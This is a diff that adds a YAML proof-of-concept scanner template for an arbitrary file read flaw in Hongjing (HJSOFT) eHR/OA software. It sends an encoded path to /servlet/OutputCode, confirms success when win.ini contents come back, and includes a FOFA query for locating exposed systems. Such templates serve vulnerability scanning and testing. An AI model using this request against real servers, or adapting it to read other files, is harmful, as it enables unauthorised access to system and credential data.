@@ -1,0 +1,24 @@
+id: poc-yaml-hongjing-outputcode-file-read
+info:
+  name: 宏景OA系统 outputcode 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+requests:
+- method: GET
+  path: /servlet/OutputCode?path=Ix1E5Anj26gg4vfnak8pSKVU3Fi5TGhY
+  expression: 'status_code == 200 &&
+
+    contains(body,"; for 16-bit app support") &&
+
+    contains(body,"[files]") &&
+
+    contains(headers,`filename=C:\Windows\win.ini`) &&
+
+    !contains(body,"<")
+
+    '
+variables: {}
+transport: http
